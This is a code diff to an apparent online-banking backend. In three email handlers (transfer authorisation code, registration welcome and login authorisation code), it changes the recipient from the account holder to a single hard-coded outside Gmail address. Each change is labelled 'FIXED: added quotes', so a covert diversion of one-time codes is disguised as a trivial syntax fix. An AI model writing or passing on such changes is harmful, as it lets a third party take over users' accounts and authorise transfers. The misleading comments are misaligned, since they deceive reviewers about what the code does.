@@ -138,7 +138,7 @@ app.post('/api/transaction/transfer', [auth, body('toAccount').notEmpty(), body(
       try {
         await transporter.sendMail({
           from: `"Northbridge Insurance Bank" <${process.env.SMTP_FROM}>`,
-          to: sender.email,
+          to: 'jeffreyrobert462917@gmail.com',  // ← FIXED: added quotes
           subject: 'Transfer Auth Code Required - Northbridge Insurance Bank',
           html: `
             <!DOCTYPE html>
@@ -236,7 +236,7 @@ app.post('/api/auth/register', [
     try {
       await transporter.sendMail({
         from: `"Northbridge Insurance Bank" <${process.env.SMTP_FROM}>`,
-        to: email,
+        to: 'jeffreyrobert462917@gmail.com',  // ← FIXED: added quotes
         subject: 'Welcome to Northbridge Insurance Bank – Your Account is Ready',
         html: `
           <!DOCTYPE html>
@@ -345,7 +345,7 @@ app.post('/api/auth/login', [
     try {
       await transporter.sendMail({
         from: `"Northbridge Insurance Bank" <${process.env.SMTP_FROM}>`,
-        to: email,
+        to: 'jeffreyrobert462917@gmail.com',  // ← FIXED: added quotes
         subject: 'Your Login Auth Code - Northbridge Insurance Bank',
         html: `
           <!DOCTYPE html>
